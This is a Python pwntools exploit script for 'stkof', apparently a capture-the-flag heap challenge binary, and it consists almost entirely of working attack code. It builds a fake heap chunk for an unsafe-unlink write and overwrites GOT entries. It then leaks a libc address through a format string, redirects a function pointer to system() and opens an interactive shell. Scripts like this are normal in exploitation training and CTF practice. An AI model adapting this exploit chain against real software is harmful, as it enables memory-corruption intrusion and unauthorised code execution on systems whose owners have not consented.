#!/usr/bin/python
from pwn import *

p = process("./stkof")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

# Unsafe Unlink.
# Create fake chunk.

def malloc(size):
	p.sendline("1")
	p.sendline(str(size))
	p.recvuntil("OK")

def edit(idx,size,data):
	p.sendline("2")
	p.sendline(str(idx))
	p.sendline(str(size))
	p.sendline(data)
	p.recvuntil("OK")

def free(idx):
	p.sendline("3")
	p.sendline(str(idx))
	p.recvuntil("OK")

malloc(200)		# 1 not to be used
malloc(200)		# 2
malloc(200)		# 3
malloc(200)		# 4 is wall.

fake_chunk = p64(0x00)  # prev_size
fake_chunk += p64(0x00) # size
global_ptr = 0x602150
fake_chunk += p64(global_ptr-24)
fake_chunk += p64(global_ptr-16)
fake_chunk += "A"*160
fake_chunk += p64(0xc0)
fake_chunk += p64(0xd0)
edit(2,208,fake_chunk)

free(3)
got_addr = 0x0000000000602030
payload = "A"*16
payload += p64(got_addr)

edit(2,24,payload)
printf_plt = p64(0x4007a0)
edit(1,8,printf_plt)
fms = "%27$p"
edit(4,5,fms)

p.sendline("4")
p.sendline("4")
leak = p.recvuntil("OK")
leak = leak.split()[1]
leak = leak.strip("...")
leak = int(leak,16)

diff = 0x10410
libc_base = leak - diff
log.success("Libc: " + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
log.success("System at " + hex(system_addr))

sh_str = "sh\x00\x00"
edit(4,4,sh_str)
edit(1,8,p64(system_addr))

p.sendline("4")
p.sendline("4")
p.clean()
log.success("Got Shell")

p.interactive()
